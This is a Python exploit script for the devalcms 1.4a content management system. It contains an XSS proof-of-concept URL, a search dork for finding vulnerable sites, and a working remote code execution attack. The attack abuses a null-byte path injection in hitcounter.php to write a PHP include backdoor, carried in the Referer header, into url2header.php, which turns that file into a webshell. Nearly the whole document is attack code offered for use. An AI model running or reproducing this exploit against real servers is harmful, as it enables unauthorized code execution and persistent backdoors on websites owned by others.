devalcms 1.4a XSS / Remote Code Execution Exploit
=================================================



#!/usr/bin/python
#####################################################################################
####           devalcms v1.4a Remote Code Execution Exploit / Xss                ####
#####################################################################################
#Discovered by : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                               #
#####################################################################################
#                                                                                   #
#Download : http://www.sourceforge.net/projects/devalcms                            #
#                                                                                   #
#DORK : "powered by devalcms v1.4.a"                                                #
#                                                                                   #
#####################################################################################
#                                      [Xss]                                        #
#                                                                                   #
#http://Site/[path]/index.php?currentpath=<script>alert(&#039;Xss&#039;)</script>             #
#                                                                                   #
#####################################################################################
#                                                                                   #
#                           [Remote Code Execution]                                 #
#                                                                                   #
#Use this exploit for remote code execution valun .                                 #
#                                                                                   #
#####################################################################################
#                           Site : Http://IRCRASH.COM                               #
###################################### TNX GOD ######################################
import sys,socket
argv=sys.argv
data=&#039;<?php include $_GET[\&#039;evil\&#039;]; ?>&#039;
query=&#039;/modules/tool/hitcounter.php?gv_folder_data=./url2header.php%00&#039;
if len(argv) < 3 :
    print &#039;[*]Devalcms v1.4.a Remote code execut exploit&#039;
    print &#039;[*]Dork : powered by devalcms v1.4.a&#039;
    print &#039;[*]Powered by : R3d.W0rm&#039;
    print &#039;[*]Our Site : http://ircrash.com&#039;
    print &#039;[*]Usage : &#039; + argv[0] + &#039; site /path&#039;
    exit()
if &#039;http://&#039; in argv[1] :
    target=argv[1].replace(&#039;http://&#039;,&#039;&#039;)
else :
    target=argv[1]
if &#039;/&#039; in argv[2] :
    path=argv[2]
else :
    path=&#039;/&#039; + argv[2]
print &#039;[*]Devalcms v1.4.a Remote code execut exploit&#039;
print &#039;[*]Powered by : R3d.W0rm&#039;
print &#039;[*]Our Site : http://ircrash.com&#039;
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target,80))
sock.send("GET " + path + query + " HTTP/1.1\n")
sock.send("Host: " + target + "\n")
sock.send("Referer: " + data + "\n\n\n")
recv=sock.recv(2048)
if &#039;HTTP/1.1 200 OK&#039; in recv :
    print &#039;[+]Code injected .&#039;
    print &#039;[+]Code inject in http://: &#039; + target + path + &#039;/modules/tool/url2header.php&#039;
else :
    print &#039;[-]Can not inject code.&#039;
exit()




